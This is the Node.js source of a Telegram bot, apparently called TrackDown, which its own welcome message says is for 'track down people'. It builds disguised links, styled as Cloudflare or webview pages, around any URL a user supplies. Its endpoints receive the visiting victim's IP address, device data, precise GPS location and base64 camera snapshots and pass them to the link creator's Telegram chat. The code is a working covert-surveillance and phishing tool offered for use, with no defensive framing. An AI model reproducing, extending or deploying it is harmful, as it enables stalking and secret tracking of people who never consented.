require('dotenv').config();
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = process.env["bot"];
const bot = new TelegramBot(TOKEN, { polling: true }); // ✅ Polling only

const jsonParser = bodyParser.json({ limit: "20mb", type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: "20mb", type: 'application/x-www-form-urlencoded' });

const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// ✅ Remove trailing slash
const hostURL = "https://trackdown-ld0o.onrender.com";
const use1pt = false;

// ==================== Routes ====================

app.get("/w/:path/:uri", (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
    let d = new Date().toJSON().slice(0, 19).replace('T', ':');

    if (req.params.path) {
        res.render("webview", {
            ip,
            time: d,
            url: Buffer.from(req.params.uri, "base64").toString("utf-8"),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }
});

app.get("/c/:path/:uri", (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
    let d = new Date().toJSON().slice(0, 19).replace('T', ':');

    if (req.params.path) {
        res.render("cloudflare", {
            ip,
            time: d,
            url: Buffer.from(req.params.uri, "base64").toString("utf-8"),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }
});

// Simple health check
app.get("/", (req, res) => {
    res.json({ status: "Bot is running ✅" });
});

// Handle location data
app.post("/location", (req, res) => {
    const lat = parseFloat(req.body.lat) || null;
    const lon = parseFloat(req.body.lon) || null;
    const uid = decodeURIComponent(req.body.uid) || null;
    const acc = decodeURIComponent(req.body.acc) || null;

    if (lat && lon && uid && acc) {
        bot.sendLocation(parseInt(uid, 36), lat, lon);
        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
        res.send("Done");
    }
});

// Device info
app.post("/", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    let data = decodeURIComponent(req.body.data) || null;
    const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;

    if (uid && data) {
        if (data.indexOf(ip) < 0) return res.send("ok");
        data = data.replaceAll("<br>", "\n");
        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
        res.send("Done");
    }
});

// Camera snap
app.post("/camsnap", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    const img = decodeURIComponent(req.body.img) || null;

    if (uid && img) {
        const buffer = Buffer.from(img, 'base64');
        bot.sendPhoto(parseInt(uid, 36), buffer, { filename: "camsnap.png", contentType: 'image/png' });
        res.send("Done");
    }
});

// ==================== Bot Logic ====================

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
        createLink(chatId, msg.text);
    }

    if (msg.text === "/start") {
        const m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] }) };
        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name}!\nYou can use this bot to track down people.\n\nType /help for more info.`, m);
    } else if (msg.text === "/create") {
        createNew(chatId);
    } else if (msg.text === "/help") {
        bot.sendMessage(chatId, `Send /create to begin...`);
    }
});

bot.on('callback_query', async (callbackQuery) => {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data === "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

async function createLink(cid, msg) {
    const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
    if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
        const url = cid.toString(36) + '/' + Buffer.from(msg, "utf-8").toString("base64");
        const m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]] }) };
        const cUrl = `${hostURL}/c/${url}`;
        const wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");
        if (use1pt) {
            const x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
            const y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

            let f = "", g = "";
            for (let c in x) f += x[c] + "\n";
            for (let c in y) g += y[c] + "\n";

            bot.sendMessage(cid, `New links created!\nURL: ${msg}\n\n🌐 CloudFlare: \n${f}\n\n🌐 WebView: \n${g}`, m);
        } else {
            bot.sendMessage(cid, `New links created!\nURL: ${msg}\n\n🌐 CloudFlare: ${cUrl}\n🌐 WebView: ${wUrl}`, m);
        }
    } else {
        bot.sendMessage(cid, `⚠️ Please enter a valid URL (http/https).`);
        createNew(cid);
    }
}

function createNew(cid) {
    const mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
    bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

// ==================== Start Server ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ App running on port ${PORT}`);
});
